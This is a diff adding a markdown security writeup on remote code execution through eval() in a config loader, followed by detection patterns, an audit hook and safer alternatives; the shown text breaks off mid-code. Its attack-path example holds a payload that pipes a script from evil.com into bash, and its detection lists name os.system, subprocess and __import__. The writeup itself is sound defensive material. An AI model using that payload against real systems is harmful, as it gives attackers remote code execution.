@@ -1,0 +1,138 @@
+## Remote Code Execution Path
+
+The vulnerability exists because `eval()` in the config loader executes arbitrary Python code from a user-controlled string:
+
+```python
+# Vulnerable code
+config = json.loads(user_input)  # or yaml, pickle, etc.
+result = eval(config['transform'])  # Executes attacker-controlled string
+```
+
+**Attack path:**
+1. Attacker crafts a malicious config file with `transform` field containing Python code:
+```json
+{
+  "transform": "__import__('os').system('curl http://evil.com/backdoor.sh | bash')"
+}
+```
+2. When `eval()` processes this string, it executes the shell command
+3. This gives the attacker full control over the system
+
+## Detection Methods
+
+### 1. Static Analysis
+```python
+# Detect suspicious patterns in config values
+import re
+
+suspicious_patterns = [
+    r'__import__\s*\(',
+    r'exec\s*\(',
+    r'eval\s*\(',
+    r'os\.system',
+    r'subprocess',
+    r'import\s+os',
+    r'import\s+subprocess',
+    r'\bopen\s*\(',
+    r'__builtins__'
+]
+
+def detect_malicious_config(config_str):
+    for pattern in suspicious_patterns:
+        if re.search(pattern, config_str, re.IGNORECASE):
+            return True
+    return False
+```
+
+### 2. Runtime Monitoring
+```python
+# Monitor eval() calls with audit hooks
+import sys
+import ast
+
+def audit_hook(event, args):
+    if event == 'exec' or event == 'compile':
+        suspicious = ['__import__', 'os.system', 'subprocess']
+        source_code = args[0] if args else ''
+        if any(s in str(source_code) for s in suspicious):
+            alert_security_team('RCE attempt detected', source_code)
+            raise RuntimeError("Security violation detected")
+
+sys.addaudithook(audit_hook)
+```
+
+### 3. Network Detection
+- Monitor for DNS queries to suspicious domains from data loader processes
+- Detect outbound connections to known C2 servers
+- Log all spawned child processes from data loading operations
+
+## Blocking Approaches
+
+### 1. Replace eval() with Safe Alternatives
+
+**Option A: Use ast.literal_eval() for literal expressions:**
+```python
+import ast
+
+def safe_transform(config):
+    # Only allows literals: strings, numbers, tuples, lists, dicts, booleans, None
+    return ast.literal_eval(config['transform'])
+```
+
+**Option B: Use a restricted environment:**
+```python
+import ast
+
+class SafeEvaluator:
+    ALLOWED_FUNCTIONS = {'abs', 'int', 'str', 'len', 'float', 'bool', 'list', 'dict'}
+    
+    @classmethod
+    def safe_eval(cls, expression, context=None):
+        parsed = ast.parse(expression, mode='eval')
+        cls._validate_ast(parsed.body)
+        compiled = compile(parsed, '<string>', 'eval')
+        return eval(compiled, {"__builtins__": {}}, context or {})
+    
+    @classmethod
+    def _validate_ast(cls, node):
+        if isinstance(node, ast.Call):
+            if not isinstance(node.func, ast.Name):
+                raise ValueError("Function calls must be by name")
+            if node.func.id not in cls.ALLOWED_FUNCTIONS:
+                raise ValueError(f"Function {node.func.id} is not allowed")
+        for child in ast.walk(node):
+            if isinstance(child, (ast.Import, ast.ImportFrom)):
+                raise ValueError("Import statements not allowed")
+```
+
+### 2. Input Validation and Sanitization
+```python
+import json
+
+def safe_config_loader(config_file):
+    with open(config_file, 'r') as f:
+        config = json.load(f)
+    
+    # Validate transform field strictly
+    transform = config.get('transform', '')
+    
+    # Only allow simple math operations
+    allowed_chars = set('0123456789+-*/()%., ')
+    if not all(c in allowed_chars for c in transform):
+        raise ValueError("Invalid transform expression")
+    
+    # Execute in sandboxed environment
+    return safe_eval_math(transform)
+```
+
+### 3. Use Domain-Specific Configuration (Recommended)
+Instead of arbitrary code execution, define a transformation schema:
+```python
+TRANSFORMATIONS = {
+    'normalize': lambda x: (x - x.min()) / (x.max() - x.min()),
+    'standardize': lambda x: (x - x.mean()) / x.std(),
+    'log': lambda x: np.log1p(x),
+}
+
+def safe_transform(config):
+    if config['transform'] not
